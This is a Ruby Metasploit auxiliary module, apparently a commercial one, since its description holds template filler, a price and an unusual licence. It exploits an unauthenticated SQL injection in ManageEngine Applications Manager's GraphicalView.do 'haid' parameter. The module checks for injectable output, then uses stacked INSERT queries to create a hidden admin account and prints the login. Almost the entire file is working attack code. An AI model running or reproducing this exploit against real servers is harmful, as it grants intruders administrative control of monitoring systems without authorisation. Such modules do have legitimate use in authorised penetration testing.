##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ManageEngine Applications Manager Unauthenticated Admin Creation',
      'Description'    => %q{
    This module exploits an unauthenticated stackable SQL injection in order to
    add a new admin user to the database.

    A longer description after the short description goes into more
    detail about the module, the vulnerbaility, or whatever information
    is useful to provide for documentation purposes.

    Categories: Enterprise

    Price: 4

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
         Opt::RPORT(9090),
         OptString.new("TARGETURI", [true, 'The relative URI', '/']),
      ], self.class)
  end

  def check
    left = Rex::Text.rand_text_alpha(8)
    right = Rex::Text.rand_text_alpha(8)
    flag = Rex::Text.rand_text_alpha(8)

    res = make_injected_request('UNION ALL SELECT '+str2chr(left+flag+right)+'--')

    f = $1 if res.body =~ /#{left}(.*)#{right}/

    if f == flag
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end

  def run

    unless check == Msf::Exploit::CheckCode::Vulnerable
      fail_with(Failure::Unknown, "Server not vulnerable")
    end

    username = Rex::Text.rand_text_alpha(8)
    password = Rex::Text.rand_text_alpha(8)

    make_injected_request(';INSERT into am_userpasswordtable (userid,username,password,emailid,description,apikey,restrictedadmin)'+
                          ' values('+Random.rand(10000).to_s+ #id
                          ','+str2chr(username)+ #username
                          ','+str2chr(Digest::MD5.hexdigest(password))+ #password
                          ','+str2chr(Rex::Text.rand_text_alpha(8))+ #email
                          ','+str2chr(Rex::Text.rand_text_alpha(8))+#description
                          ','+str2chr(Digest::MD5.hexdigest(Rex::Text.rand_text_alpha(5)))+ #apikey
                          ',1);INSERT into am_usergrouptable values ('+str2chr(username)+', '+str2chr('ADMIN')+');--')

    print_good("Please log in with the following credentials: " + username+":"+password)

  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'GraphicalView.do'),
      'vars_get' => {
        'haid' => '0 ' + sql,
        'method' => 'popUp',
        'isPopUp' => true
      }
    })
  end

  def str2chr(str)
    ret = ''
    str.split('').each do|c|
      ret = ret + 'chr('+c.ord.to_s+')||'
    end

    return ret[0..-3]
  end
end

